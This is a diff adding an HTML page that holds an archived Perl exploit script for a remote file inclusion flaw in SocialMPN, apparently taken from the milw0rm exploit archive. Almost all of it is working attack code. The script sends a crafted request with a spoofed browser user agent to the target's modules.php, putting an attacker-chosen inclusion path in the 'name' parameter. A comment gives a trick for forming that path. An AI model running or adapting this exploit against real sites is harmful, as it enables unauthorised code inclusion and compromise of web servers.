@@ -1,0 +1,49 @@
+<html>
+<head>
+<title>SocialMPN Arbitrary File Injection Exploit</title>
+<pre>
+#!/usr/bin/perl -w
+ 
+# Remote Testing SocialMPN Remote File Inclusion by y3dips [for testing only]
+# Bug find by zer0-c00l ,
+# Bug published at http://waraxe.us/ftopic-542-0-days0-orderasc-.html
+
+print &quot; * Remote Testing File Inclusion for SocialMPN by y3dips *\n&quot;;
+
+require LWP::UserAgent;
+
+if(@ARGV == 2)
+        {
+      
+$target= $ARGV[0];
+$xploit= $ARGV[1];
+
+
+my $ua = LWP::UserAgent-&gt;new;
+$ua-&gt;agent(&quot;MSIE/6.0 Windows&quot;);
+$ua-&gt;timeout(10);
+$ua-&gt;env_proxy;
+
+$url = &quot;http://$target/modules.php?name=$xploit&amp;file=article&amp;sid=2&quot;;
+# just for trick , use &quot;?&quot; in the last char of your file inclusion path
+
+my $injek = $ua-&gt;get($url);
+
+            print &quot; -------------------------------\n&quot;;
+   if ($injek-&gt;is_success)
+   {
+      $injekcek = $injek-&gt;as_string;
+        if ($injekcek =~ /(HTTP\/1\.0 200 OK)/)
+        { print(&quot;\n This Site Maybe Vulnerable \n&quot;); }
+      else
+        {die $injek-&gt;status_line;}
+            print &quot; -------------------------------\n&quot;;
+        }
+   }
+
+else{
+print &quot;Use: perl $0 [target] [xplo.txt] \n&quot;;
+}</pre>
+# milw0rm.com [2005-03-11]
+</html>
+
